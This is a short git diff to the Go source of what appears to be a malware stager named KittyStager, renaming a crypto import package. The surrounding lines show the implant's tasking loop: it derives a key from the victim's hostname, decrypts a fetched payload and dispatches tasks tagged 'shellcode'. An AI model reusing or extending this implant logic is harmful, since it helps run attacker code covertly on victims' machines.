@@ -5,7 +5,7 @@ package main
 
 import "C"
 import (
-	"KittyStager/cmd/cryptoUtil"
+	"KittyStager/cmd/crypto"
 	"KittyStager/cmd/malwareUtil"
 	"KittyStager/cmd/util"
 	_ "embed"
@@ -58,8 +58,8 @@ func Init() {
 		if len(body) < 10 {
 			malwareUtil.Sleep(sleepTime)
 		} else {
-			key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
-			hexSc, _ := cryptoUtil.Decrypt(body, []byte(key))
+			key := crypto.GenerateKey(initChecks.GetHostname(), 32)
+			hexSc, _ := crypto.Decrypt(body, []byte(key))
 			task, _ := malwareUtil.UnmarshalJSON(hexSc)
 			switch task.Tag {
 			case "shellcode":
